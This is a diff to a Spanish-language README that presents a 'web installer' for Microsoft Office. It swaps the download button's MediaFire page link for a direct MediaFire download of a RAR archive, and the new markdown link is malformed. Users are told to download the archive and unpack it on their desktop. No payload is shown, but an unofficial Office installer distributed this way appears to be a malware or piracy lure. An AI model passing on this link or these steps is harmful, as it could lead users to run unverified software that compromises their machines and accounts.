@@ -25,7 +25,7 @@ Nuestro instalador web guía a los usuarios a través del proceso de instalació
 
 - Descarga el programa desde el boton verde
 
-[![Descargar](/archivos/boton-descarga.png)](https://www.mediafire.com/file/vsvfrueeydqfc6s/Instalador+de+Office+(web).rar/file)
+[![Descargar](/archivos/boton-descarga.png)]([https://www.mediafire.com/file/vsvfrueeydqfc6s/Instalador+de+Office+(web).rar/file](https://download1075.mediafire.com/xrl7il36c5og1jZHd3l-7-4bt4Nlyl0yw-ltkifzHb5vdSOuM-UTSZ0WB1rdR0eMg2Z0eLcxOM8UwBN5ZHBFx-zwEzi8VmQDjuQazJQaY8FBkQpL6YWBvIroCNMcvFecVgC8h1mS_eSOlq8FvgoLZPDukIX7nbjcFZPhNTvnJOfE/vsvfrueeydqfc6s/Instalador+de+Office+%28web%29.rar))
 
 - Descomprimelo en el escritorio
 
